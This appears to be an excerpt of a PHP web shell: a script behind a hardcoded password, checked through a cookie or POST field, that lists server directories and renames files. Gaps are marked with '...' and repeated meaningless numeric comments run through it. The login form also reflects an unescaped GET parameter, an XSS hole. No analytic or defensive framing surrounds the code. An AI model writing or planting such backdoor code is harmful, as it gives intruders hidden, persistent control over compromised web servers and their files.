...
$auth_key = "1818031b8bbc5504c1d9ac004c2e8490";
...
$pass = false;
if (isset($_COOKIE['pw_name_58927'])) {
    if(($_COOKIE['pw_name_58927']) == $auth_key) {
        $pass = true;
    }
} else {
    if (isset($_POST['pw_name_58927'])) {
        if(($_POST['pw_name_58927']) == $auth_key) {
            setcookie("pw_name_58927", $_POST['pw_name_58927']);
            $pass = true;
        }
    }
}
if (!$pass) {
    die("<form action='?p=' method=post ><input type=password name='pw_name_58927' value='".$_GET['pw']."'  required><input type=submit name='watching' ></form>");
}
// ---- // 1724682773621042 1724682773947119 1724682773464022 1724682773907717
...
foreach ($paths as $id => $dir_part) {
    ...
    if ($dir_part == '')
        continue;// 1724682773621042 1724682773947119 1724682773464022 1724682773907717
    echo "<a href='?p=";
    for ($i = 0; $i <= $id; $i++) {
...
if (isset($_GET['r'])) {
    ...
    <form method="post">
        ...
        if (isset($_POST['rename'])) {// 1724682773621042 1724682773947119 1724682773464022 1724682773907717
            $name = PATH . "/" . $_GET['r'];
